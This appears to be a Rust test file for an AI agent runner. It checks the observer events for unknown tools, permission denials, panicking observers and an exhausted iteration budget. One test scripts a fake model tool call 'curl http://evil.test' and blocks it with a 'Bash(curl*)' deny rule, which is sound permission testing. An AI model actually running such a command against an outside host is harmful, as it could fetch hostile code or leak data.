use super::support::{
    AgentConfig, AgentError, AgentObserver, AgentRunner, AgentSession, Arc, AssistantContent,
    CollectingObserver, CompositeObserver, EventKind, FakeModel, PanicObserver, PermissionPolicy,
    RuleOrigin, ToolRegistry, bash, event_label, parse_rule, response,
};

#[tokio::test]
async fn unknown_tool_emits_tool_end_without_tool_start() {
    let model = FakeModel::new([
        response(AssistantContent::tool_call(
            "call_1",
            "ghost",
            serde_json::json!({}),
        )),
        response(AssistantContent::text("ok")),
    ]);
    let observer = Arc::new(CollectingObserver::default());
    let runner = AgentRunner::new(model, ToolRegistry::new()).with_observer(observer.clone());
    let mut session = AgentSession::new();

    runner
        .run_turn(&mut session, "call a ghost")
        .await
        .expect("an unknown tool is model-recoverable");

    let events = observer.events();
    // The tool never resolved, so it gets a ToolEnd with no ToolStart.
    assert!(
        !events
            .iter()
            .any(|e| matches!(e.kind, EventKind::ToolStart { .. }))
    );
    let tool_ends: Vec<_> = events
        .iter()
        .filter(|e| matches!(e.kind, EventKind::ToolEnd { .. }))
        .collect();
    assert_eq!(tool_ends.len(), 1);
    assert!(matches!(
        &tool_ends[0].kind,
        EventKind::ToolEnd { ok: false, error: Some(f), .. } if f.kind.as_str() == "unknown_tool"
    ));
}

#[tokio::test]
async fn permission_denied_emits_failed_tool_end_after_start() {
    let model = FakeModel::new([
        response(AssistantContent::tool_call(
            "call_1",
            "bash",
            serde_json::json!({ "cmd": "curl http://evil.test" }),
        )),
        response(AssistantContent::text("understood")),
    ]);
    let mut registry = ToolRegistry::new();
    registry.register(bash().await);
    let mut policy = PermissionPolicy::new();
    policy
        .deny
        .extend(parse_rule("Bash(curl*)", RuleOrigin::ProjectSettings).unwrap());
    let observer = Arc::new(CollectingObserver::default());
    let runner = AgentRunner::new(model, registry)
        .with_policy(policy)
        .with_observer(observer.clone());
    let mut session = AgentSession::new();

    runner
        .run_turn(&mut session, "fetch the script")
        .await
        .expect("a denial is model-recoverable");

    let events = observer.events();
    // The request was computed, so ToolStart fires before the deny verdict.
    assert!(events.iter().any(|e| matches!(
        &e.kind,
        EventKind::ToolStart { tool_call_id, .. } if tool_call_id == "call_1"
    )));
    let tool_ends: Vec<_> = events
        .iter()
        .filter_map(|e| match &e.kind {
            EventKind::ToolEnd { error, .. } => Some(error.clone()),
            _ => None,
        })
        .collect();
    assert_eq!(tool_ends.len(), 1);
    assert!(matches!(&tool_ends[0], Some(f) if f.kind.as_str() == "permission_denied"));
}

#[tokio::test]
async fn composite_observer_isolates_a_panicking_observer() {
    let model = FakeModel::new([response(AssistantContent::text("done"))]);
    let collecting = Arc::new(CollectingObserver::default());
    let composite = CompositeObserver(vec![
        Arc::new(PanicObserver) as Arc<dyn AgentObserver>,
        collecting.clone(),
    ]);
    let runner = AgentRunner::new(model, ToolRegistry::new()).with_observer(Arc::new(composite));
    let mut session = AgentSession::new();

    let turn = runner
        .run_turn(&mut session, "go")
        .await
        .expect("a panicking observer must not unwind the turn");
    assert_eq!(turn.final_text(&session), "done");

    // The healthy observer still received the full stream.
    let kinds: Vec<_> = collecting
        .events()
        .iter()
        .map(|e| event_label(&e.kind))
        .collect();
    assert_eq!(kinds, vec!["model_start", "assistant"]);
}

#[tokio::test]
async fn bare_panicking_observer_does_not_unwind_the_runner() {
    // A bare (non-composite) observer has no isolation of its own, so a
    // surviving turn proves `emit` itself swallows the panic — a rendering
    // frontend must never be able to crash the agent loop.
    let model = FakeModel::new([response(AssistantContent::text("done"))]);
    let runner =
        AgentRunner::new(model, ToolRegistry::new()).with_observer(Arc::new(PanicObserver));
    let mut session = AgentSession::new();

    let turn = runner
        .run_turn(&mut session, "go")
        .await
        .expect("a panicking bare observer must not unwind the turn");
    assert_eq!(turn.final_text(&session), "done");
}

#[tokio::test]
async fn pre_iteration_error_carries_no_iteration() {
    let observer = Arc::new(CollectingObserver::default());
    let runner = AgentRunner::with_config(
        FakeModel::default(),
        ToolRegistry::new(),
        AgentConfig {
            max_iterations: 0,
            ..AgentConfig::default()
        },
    )
    .with_observer(observer.clone());
    let mut session = AgentSession::new();

    let err = runner
        .run_turn(&mut session, "go")
        .await
        .expect_err("a zero iteration budget cannot complete");
    assert!(matches!(err, AgentError::MaxIterations { .. }));

    let events = observer.events();
    // The model was never called, so the only event is the terminal Error,
    // which has no owning model call — `iteration` is `None`, not `Some(0)`.
    assert_eq!(events.len(), 1);
    assert_eq!(events[0].iteration, None);
    assert!(matches!(
        &events[0].kind,
        EventKind::Error { kind, .. } if kind == "max_iterations"
    ));
}
